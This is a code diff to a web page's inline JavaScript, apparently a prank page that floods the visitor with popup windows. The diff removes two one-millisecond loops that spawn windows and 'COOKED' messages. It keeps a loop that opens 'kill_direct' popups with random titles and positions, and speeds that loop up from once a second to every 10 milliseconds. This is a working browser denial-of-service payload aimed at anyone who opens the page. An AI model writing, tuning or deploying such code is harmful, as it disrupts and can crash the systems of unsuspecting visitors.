@@ -55,21 +55,12 @@
                         element.focus()
                     })
                 }, 1000)
-                
-                setInterval(function() {
-                    newWindows.push(window.open("https://hacklers.github.io/blank", "", "width=400,height=400"))
-                }, 1)
-                setInterval(function() {
-                    addWindow("COOKED!!!!111!")
-                    addWindow("COOKED!!!!111!")
-                    addWindow("<img src='https://i.pinimg.com/736x/72/cf/8e/72cf8eeeaf310f363608fd30367ac635.jpg' width='100%' height='100%'>")
-                }, 1)
-
+            
                 setInterval(function() {
                     var kill_direct = window.open("https://hacklers.github.io/kill_direct", "", "width=400, height=400")
                     kill_direct.document.title = Math.random() * Number.MAX_VALUE
                     kill_direct.moveTo(Math.floor(Math.random() * (window.screen.availWidth - 400), Math.random() * (window.screen.availHeight - 400)))
-                }, 1000)
+                }, 10)
         </script>
     </body>
 </html>
